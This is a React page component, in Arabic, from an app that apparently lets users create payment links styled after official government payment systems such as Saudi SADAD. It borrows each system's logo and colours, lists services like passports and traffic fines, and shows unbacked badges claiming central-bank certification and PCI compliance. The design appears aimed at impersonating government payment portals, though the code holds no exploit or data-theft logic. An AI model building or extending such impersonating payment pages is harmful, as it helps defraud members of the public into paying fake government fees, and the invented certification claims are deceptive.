import React, { useState, useMemo } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Shield, CheckCircle2, Landmark, Link as LinkIcon } from 'lucide-react';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import BackButton from '@/components/BackButton';
import SEOHead from '@/components/SEOHead';

const GovernmentPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const countryParam = searchParams.get('country') || 'SA';

  const govSystem = useMemo(() => {
    return getGovernmentPaymentSystem(countryParam);
  }, [countryParam]);

  const handleCreateLink = () => {
    navigate(`/create/${countryParam}/government/sadad`);
  };

  return (
    <>
      <SEOHead 
        title={`السداد الحكومي - ${govSystem.nameAr}`}
        description={`دفع رسوم الخدمات الحكومية عبر ${govSystem.nameAr} - جواز السفر، المخالفات المرورية، رخصة القيادة، الخدمات البلدية والمزيد`}
        image="/og-government_payment.jpg"
        type="website"
      />
      
      <div 
        className="min-h-screen py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <div className="container mx-auto max-w-3xl">
          <div className="mb-6">
            <BackButton />
          </div>

          <Card 
            className="overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-8 sm:p-12 text-center"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="flex items-center justify-center gap-4 mb-6">
                {govSystem.logo && (
                  <div className="bg-white p-3 rounded-xl">
                    <img 
                      src={govSystem.logo} 
                      alt={govSystem.nameAr}
                      className="h-14 w-auto object-contain"
                    />
                  </div>
                )}
              </div>
              <h1 className="text-4xl font-bold text-white mb-3">
                {govSystem.nameAr}
              </h1>
              <p className="text-white/90 text-lg">
                نظام الدفع الإلكتروني للخدمات الحكومية
              </p>
            </div>

            <div className="p-8 sm:p-12 space-y-8">
              <div className="text-center">
                <h2 className="text-2xl font-bold mb-4" style={{ color: govSystem.colors.text }}>
                  خدمات السداد الحكومي المتاحة
                </h2>
                <p className="text-gray-600 text-lg">
                  يمكنك إنشاء روابط دفع لجميع الخدمات الحكومية والمحلية
                </p>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                {[
                  '🛂 جواز السفر',
                  '🚗 المخالفات المرورية',
                  '🪪 رخصة القيادة',
                  '🏛️ الخدمات البلدية',
                  '📄 العقود',
                  '🆔 بطاقة الأحوال',
                  '🎓 الخدمات التعليمية',
                  '🏥 الخدمات الصحية',
                  '💼 تصاريح العمل',
                  '🛡️ التأمين',
                  '🚙 استمارة المركبة',
                  '📦 الجمارك',
                  '💡 فواتير الخدمات'
                ].map((service, index) => (
                  <div 
                    key={index}
                    className="p-4 rounded-lg text-center border-2 hover:shadow-md transition-all"
                    style={{
                      borderColor: `${govSystem.colors.primary}20`,
                      background: `${govSystem.colors.primary}05`
                    }}
                  >
                    <div className="text-sm font-semibold" style={{ color: govSystem.colors.text }}>
                      {service}
                    </div>
                  </div>
                ))}
              </div>

              <div 
                className="p-6 rounded-lg"
                style={{
                  background: `${govSystem.colors.primary}10`,
                  borderRight: `4px solid ${govSystem.colors.primary}`
                }}
              >
                <div className="flex items-start gap-3">
                  <Shield className="w-6 h-6 mt-0.5" style={{ color: govSystem.colors.primary }} />
                  <div className="flex-1">
                    <h4 className="font-bold text-lg mb-2" style={{ color: govSystem.colors.primary }}>
                      معاملة آمنة ومشفرة
                    </h4>
                    <p className="text-sm text-gray-600">
                      جميع البيانات محمية بتقنية التشفير SSL ومعتمدة من البنك المركزي
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={handleCreateLink}
                className="w-full h-16 text-xl font-bold text-white shadow-2xl hover:shadow-3xl transition-all duration-300"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.xl
                }}
              >
                <LinkIcon className="w-6 h-6 ml-2" />
                <span>إنشاء رابط دفع</span>
              </Button>

              <div className="pt-6 border-t">
                <h3 className="font-bold text-xl mb-4" style={{ color: govSystem.colors.text }}>
                  إرشادات الدفع
                </h3>
                <ul className="space-y-3 text-base text-gray-700">
                  <li className="flex items-center gap-3">
                    <Shield className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                    جميع المعاملات محمية بأعلى معايير الأمان
                  </li>
                  <li className="flex items-center gap-3">
                    <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                    تأكيد فوري بعد إتمام الدفع
                  </li>
                  <li className="flex items-center gap-3">
                    <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                    إمكانية طباعة إيصال الدفع
                  </li>
                  <li className="flex items-center gap-3">
                    <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                    دعم جميع وسائل الدفع الإلكتروني
                  </li>
                </ul>
              </div>
            </div>

            <div 
              className="px-8 py-4 text-center text-xs"
              style={{
                background: govSystem.colors.surface,
                borderTop: `1px solid ${govSystem.colors.border}`
              }}
            >
              <div className="flex items-center justify-center gap-4 text-gray-500">
                <div className="flex items-center gap-1">
                  <Shield className="w-3 h-3" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <CheckCircle2 className="w-3 h-3" />
                  <span>PCI Compliant</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <CheckCircle2 className="w-3 h-3" />
                  <span>Certified by Central Bank</span>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default GovernmentPayment;
